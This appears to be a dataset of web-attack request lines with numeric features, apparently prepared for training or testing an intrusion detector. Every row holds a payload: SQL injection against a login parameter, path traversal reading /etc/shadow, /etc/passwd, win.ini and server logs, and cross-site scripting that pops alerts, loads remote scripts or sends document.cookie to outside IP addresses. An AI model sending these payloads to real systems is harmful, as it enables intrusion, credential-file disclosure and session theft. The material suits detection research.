32,1,200,5380,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5860,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5528,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3076,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3938,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5924,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2582,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2755,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2359,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1029,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4310,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1625,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
50,1,200,3060,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6313,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7032,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6187,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,3000,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,3571,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7838,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4083,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4889,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6373,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6851,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4663,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,1931,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
81,1,200,6327,7,38,14,5,2,GET /?file=<script>window.location.href="http://223.46.148.170"</script> HTTP/1.1
51,1,200,1569,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6976,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6972,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,7063,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6465,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,7307,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5301,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5901,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6608,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6675,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4454,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2890,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2651,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1570,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2815,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3272,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4037,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
32,1,200,2713,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5281,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5618,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6899,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5134,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4125,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2157,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4076,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5961,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4615,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1303,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3217,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1875,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3333,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4511,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1182,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6291,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6514,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7037,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6163,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3779,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2089,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2745,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6553,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6949,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2705,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2612,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5500,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2091,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7309,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4675,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6760,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4431,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2265,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4224,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4551,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6484,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1338,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1499,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6044,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6510,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2941,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1869,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3567,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5790,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2956,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3600,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6904,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3686,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1434,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4216,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7036,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4108,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2992,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1997,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6511,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5096,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3392,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5742,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6459,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5528,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6525,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7369,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3353,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5001,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6294,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6113,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2987,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6199,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7836,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7126,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6497,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1388,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5323,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2779,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5786,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3276,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7552,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1034,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1389,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6562,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4806,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6437,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
102,1,200,2325,7,56,19,6,2,GET /?search=<script>window.location='http://47.126.73.232/?cookie='+document.cookie</script> HTTP/1.1
51,1,200,7707,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3917,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2970,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1967,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4931,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2396,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4482,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1459,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6465,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1657,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5084,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2536,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3243,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6395,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
44,1,200,2183,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,7757,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4008,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4028,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,7243,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,3058,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,2249,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,5889,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4717,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,7043,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4152,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,3266,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4693,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,6767,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,2796,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4763,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,5491,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,5263,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,1204,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,7938,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
81,1,200,5885,8,30,16,6,2,GET /?file=<script>%window.open('http://11.220.77.102/445547')3C/script> HTTP/1.1
101,1,200,1855,7,54,19,6,2,GET /?name=<script>window.location='http://200.239.77.244/?cookie='+document.cookie</script> HTTP/1.1
61,1,200,5754,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,3383,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,5225,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2847,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,4045,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,7759,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,1249,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2505,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,1515,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,6613,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,3320,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2702,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,4822,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,7631,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2099,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,1681,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
49,1,200,2265,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,2704,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,5566,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,1444,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4979,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6952,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4765,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4453,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,5941,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,5822,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4057,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6855,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6628,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3398,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4444,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
58,1,200,2924,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2291,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,7197,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2811,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6277,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,5124,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,5095,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,5153,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,5708,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,1072,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6047,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6872,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2873,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
79,1,200,7613,8,27,16,6,2,GET /?p=<script>%window.open('http://121.153.46.235/801904')3C/script> HTTP/1.1
53,1,200,1013,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,2206,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6099,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,2855,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,4244,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,4302,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6227,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6667,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,4169,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6172,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,8000,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,7761,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6668,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6637,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,2937,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,2536,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,1485,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,1529,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,2722,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,7149,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,4812,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
83,1,200,7293,7,31,17,6,2,GET /?name=<script><script+src="http://125.124.94.172/204736.js=></script> HTTP/1.1
82,1,200,4627,7,31,17,6,2,GET /?file=<script><script+src="http://227.55.26.112/238507.js=></script> HTTP/1.1
86,1,200,3844,7,33,17,6,2,GET /?search=<script><script+src="http://132.151.107.204/250594.js=></script> HTTP/1.1
61,1,200,2699,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7080,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7722,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,5167,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,6966,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,3972,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,6763,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,4342,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7419,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,6651,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,3802,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,5428,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1220,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,2994,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7948,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1286,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,6602,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
100,1,200,3376,7,54,19,6,2,GET /?name=<script>window.location='http://160.213.10.74/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,2517,7,54,19,6,2,GET /?name=<script>window.location='http://185.94.174.33/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,2229,7,54,19,6,2,GET /?name=<script>window.location='http://97.58.177.34/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,5139,8,27,16,6,2,GET /?p=<script>%window.open('http://141.40.217.15/753833')3C/script> HTTP/1.1
60,1,200,3300,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4707,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,7476,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,6720,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,6701,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5194,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4286,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,7621,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,6208,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2410,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5182,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4735,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
48,1,200,6845,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,2528,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,4234,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,5531,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,5932,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7105,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,6985,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7611,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7608,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,2374,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,2257,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7048,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
85,1,200,3060,7,33,17,6,2,GET /?search=<script><script+src="http://142.24.134.137/980804.js=></script> HTTP/1.1
35,1,200,2262,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,3325,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,1809,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,7104,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,1191,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5999,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5267,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,6857,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,6951,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,6479,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,1952,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
80,1,200,7926,7,38,14,5,2,GET /?file=<script>window.location.href="http://211.54.227.53"</script> HTTP/1.1
100,1,200,6756,7,54,19,6,2,GET /?name=<script>window.location='http://30.242.37.150/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,3819,7,31,17,6,2,GET /?file=<script><script+src="http://88.75.149.91/85675.js=></script> HTTP/1.1
59,1,200,1817,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,4248,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
